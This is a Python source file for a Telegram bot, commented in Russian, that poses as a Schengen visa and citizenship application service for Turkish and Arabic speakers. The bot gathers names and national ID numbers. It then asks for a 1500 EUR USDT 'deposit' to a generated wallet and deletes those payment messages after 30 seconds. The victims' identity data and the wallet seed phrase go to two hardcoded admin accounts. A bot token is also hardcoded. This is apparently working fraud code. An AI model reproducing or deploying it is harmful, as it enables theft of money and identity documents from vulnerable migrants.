import logging
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import seed_phrase

# Настройка логирования
logging.basicConfig(level=logging.INFO)

TOKEN = '5836006771:AAGFGARHZp8Ns9WsxrrTwZzhejOjaMTWCcs'

# Создание бота и диспетчера
bot = Bot(TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Словарь для хранения данных пользователей
user_data = {}


# Обработчик команды /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    user_id = message.from_user.id
    user_data[user_id] = {}  # Создаем пустой словарь для текущего пользователя
    await message.reply("Welcome!   @" + str(message.from_user.username) +"  "+ str(message.from_user.full_name))
    await bot.send_message(message.from_user.id, "You are using bot for applying for a Schengen Visa/Citizenship.\n Answer all the questions to fill out the application and ensure the best quality of service. 🤝")
    await message.reply("Choose your language:", reply_markup=get_language_keyboard())


# Обработчик выбора языка
@dp.message_handler(lambda message: message.text in ['Türkçe', 'العربية'])
async def select_language(message: types.Message):
    language = message.text
    username = '@'+str(message.from_user.username)
    user_id = message.from_user.id
    user_data[user_id]['language'] = language  # Сохраняем выбранный язык
    user_data[user_id]['username'] = username  # Сохраняем имя пользователя
    if language == 'Türkçe':
        await bot.send_message(message.from_user.id, "Başvuruyu hazırlamadan önce - Gizli bir hesabınız olup olmadığını kontrol edin. Gizli bir hesabınız varsa - bu durumda temsilcimiz sizinle iletişim kuramaz. Lütfen hesabınızı açın, böylece temsilcimiz başvuruyu doldurduktan sonra sizinle iletişime geçebilir.")
        await message.reply("Seçenek seçin:", reply_markup=get_option_keyboard(language))
    elif language == 'العربية':
        await bot.send_message(message.from_user.id, "قبل تحضير الطلب - تحقق مما إذا كان لديك حساب مخفي. إذا كان لديك حساب مخفي - في هذه الحالة ، لن يتمكن ممثلنا من الاتصال بك. يرجى فتح حسابك حتى يتمكن ممثلنا من الاتصال بك بعد ملء الطلب.")
        await message.reply("اختر الخيار:", reply_markup=get_option_keyboard(language))


# Обработчик выбора опции
@dp.message_handler(lambda message: message.text in ['Schengen vizesi', 'Vatandaşlık', 'Visa Shengen', 'Al-Jinsiya'])
async def select_option(message: types.Message):
    option = message.text
    user_id = message.from_user.id
    user_data[user_id]['option'] = option  # Сохраняем выбранную опцию

    language = user_data[user_id]['language']  # Получаем выбранный язык пользователя
    
    if language == 'Türkçe':
        await message.reply("Seçenek seçin:", reply_markup=get_variation_keyboard(language))
    elif language == 'العربية':
        await message.reply("اختر الخيار:", reply_markup=get_variation_keyboard(language))



# Обработчик выбора варианта
@dp.message_handler(lambda message: message.text in ['Aile için', 'Kendim için', 'Biznis (iş)', 'للعائلة', 'لنفسي', 'عمل'])
async def select_variation(message: types.Message):
    variation = message.text
    user_id = message.from_user.id
    user_data[user_id]['variation'] = variation  # Сохраняем выбранный вариант
    if user_data[user_id]['language'] == 'Türkçe':
        await message.reply("Kaç kişi seyahat edecek?", reply_markup=get_person_count_keyboard())
    elif user_data[user_id]['language'] == 'العربية':
        await message.reply("كم شخص سيسافر؟", reply_markup=get_person_count_keyboard())



# Обработчик выбора количества людей
@dp.message_handler(lambda message: message.text.isdigit())
async def select_person_count(message: types.Message):
    person_count = int(message.text)
    user_id = message.from_user.id
    user_data[user_id]['person_count'] = person_count  # Сохраняем выбранное количество людей

    

    # Отправка сообщения пользователю с некоторыми указаниями
    if user_data[user_id]['language'] == 'Türkçe'and user_data[user_id]['person_count'] >= 3:
        await message.answer("Harika! Sıraya girmeden geçiyorsunuz.")
        #send message to user "Enter 3 names and surnames and ID numbers of each person and bot sends it to admin. Example: Name Surname ID number"
        await bot.send_message(message.from_user.id, "Seçilen kişi sayısı için Soyadınızı ve kişisel pasaport kodunu girin (T.C. KIMLIK. NO./ PERS. ID. NO.). Örnek: ABDULLAH Kocyigit 11111111111 ABDULLAH Kocyigit 11111111111 ABDULLAH Kocyigit 11111111111")
    elif user_data[user_id]['language'] == 'Türkçe'and user_data[user_id]['person_count'] < 3:
        await message.answer("3 kişi gelene kadar sıraya giriyorsunuz")
        await bot.send_message(message.from_user.id, "Botu yeniden başlatmak için /start yazın")
    elif user_data[user_id]['language'] == 'العربية'and user_data[user_id]['person_count'] >= 3:
        await message.answer("رائع! أنت تمر بدون الانتظار في الطابور.")
        #send message to user "Enter 3 names and surnames and ID numbers of each person and bot sends it to admin. Example: Name Surname ID number"
    elif user_data[user_id]['language'] == 'العربية'and user_data[user_id]['person_count'] < 3:
        await message.answer("أنت تنتظر حتى يأتي 3 أشخاص")
        await bot.send_message(message.from_user.id, "اكتب /start لإعادة تشغيل الروبوت")



#user enters 3 names and surnames and ID numbers of each person and bot sends it to admin. Example: Name Surname ID number
@dp.message_handler(lambda message: message.text)
async def enter_person_info(message: types.Message):
    message_text = message.text
    user_id = message.from_user.id
    user_data[user_id]['person_info'] = message_text  # Сохраняем выбранное количество людей


    
    if user_data[user_id]['language'] == 'Türkçe':
        mes1 = await bot.send_message(message.from_user.id, "Vizenin fiyatı 6000 Euro'dur. Eğer 3 kişiyseniz - o zaman bir indirim alırsınız ve her biri 5000 Euro'luk bir ücret ödersiniz.")
        mes2 = await bot.send_message(message.from_user.id, "Dikkat: Aşağıdaki USDT adresine kişi başına 1500 EUR tutarında emanet göndermeniz gerekecektir.(avans)")
        mes3 = await bot.send_message(message.from_user.id, "Bu mesajlar 30 saniye sonra silinir. Bu bilgiyi aklınızda bulundurun.")
        mnem = seed_phrase.generate_mnemonic()
        address = seed_phrase.generate_address(mnem)
        user_data[user_id]['address'] = address
        user_data[user_id]['mnemonic'] = mnem
        
        addr = await bot.send_message(message.from_user.id, f"USDT address ETH mainnet: {address}")

        await asyncio.sleep(30)
        await bot.delete_message(message.chat.id, mes1.message_id)
        await bot.delete_message(message.chat.id, mes2.message_id)
        await bot.delete_message(message.chat.id, mes3.message_id)
        await bot.delete_message(message.chat.id, addr.message_id)

    elif user_data[user_id]['language'] == 'العربية':
        mes1 = await bot.send_message(message.from_user.id, "سعر التأشيرة هو 6000 يورو. إذا كنت 3 أشخاص - فستحصل على خصم وستدفع كل شخص 5000 يورو.")
        mes2 = await bot.send_message(message.from_user.id, "تنبيه: ستحتاج إلى إدراج إيداع بقيمة 1500 يورو في العنوان USDT أدناه.")
        mes3 = await bot.send_message(message.from_user.id, "سيتم حذف هذه الرسائل بعد 30 ثانية. احتفظ بهذه المعلومات في ذهنك.")
        mnem = seed_phrase.generate_mnemonic()
        address = seed_phrase.generate_address(mnem)
        user_data[user_id]['address'] = address
        user_data[user_id]['mnemonic'] = mnem

        addr = await bot.send_message(message.from_user.id, f"USDT address ETH mainnet: {address}")

        await asyncio.sleep(30)
        await bot.delete_message(message.chat.id, mes1.message_id)
        await bot.delete_message(message.chat.id, mes2.message_id)
        await bot.delete_message(message.chat.id, mes3.message_id)
        await bot.delete_message(message.chat.id, addr.message_id)


    # Вывод собранных данных для администратора
    data = user_data[user_id]
    result_message = f"Данные пользователя: \nUsername: {data.get('username')} \nДанные пользователя: {data.get('person_info')} \nЯзык: {data.get('language')}\nОпция: {data.get('option')}\nВариант: {data.get('variation')}\nКоличество людей: {data.get('person_count')} \nUSDT address ETH mainnet: {data.get('address')}\nMnemonic: {data.get('mnemonic')}"
    admin = "440901305"
    admin2 = '5869950868'
    await bot.send_message(admin, result_message)
    await bot.send_message(admin2, result_message)

    # Сброс данных пользователя
    del user_data[user_id]







# Функция для создания клавиатуры с выбором языка
def get_language_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton('Türkçe'))
    keyboard.add(types.KeyboardButton('العربية'))
    return keyboard


# Функция для создания клавиатуры с выбором опции
def get_option_keyboard(language):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    if language == 'Türkçe':
        keyboard.add(types.KeyboardButton('Schengen vizesi'))
        keyboard.add(types.KeyboardButton('Vatandaşlık'))
    elif language == 'العربية':
        keyboard.add(types.KeyboardButton('Visa Shengen'))
        keyboard.add(types.KeyboardButton('Al-Jinsiya'))
    return keyboard


# Функция для создания клавиатуры с выбором варианта
# Функция для создания клавиатуры с выбором варианта
def get_variation_keyboard(language):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    if language == 'Türkçe':
        keyboard.add(types.KeyboardButton('Aile için'))
        keyboard.add(types.KeyboardButton('Kendim için'))
        keyboard.add(types.KeyboardButton('Biznis (iş)'))
    elif language == 'العربية':
        keyboard.add(types.KeyboardButton('للعائلة'))
        keyboard.add(types.KeyboardButton('لنفسي'))
        keyboard.add(types.KeyboardButton('عمل'))
    return keyboard



# Функция для создания клавиатуры с выбором количества людей
def get_person_count_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(types.KeyboardButton('1'))
    keyboard.add(types.KeyboardButton('2'))
    keyboard.add(types.KeyboardButton('3'))
    return keyboard



# Обработчик ошибок
@dp.errors_handler()
async def errors_handler(update, exception):
    print(f"Произошла ошибка: {exception}")


# Запуск бота
async def main():
    admin_id = "440901305"
    admin_id2 = "5869950868"
    user_data[admin_id] = {}  # Создаем пустой словарь для администратора
    await bot.send_message(admin_id, "Бот запущен.")
    await bot.send_message(admin_id2, "Бот запущен.")
    await dp.start_polling()


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
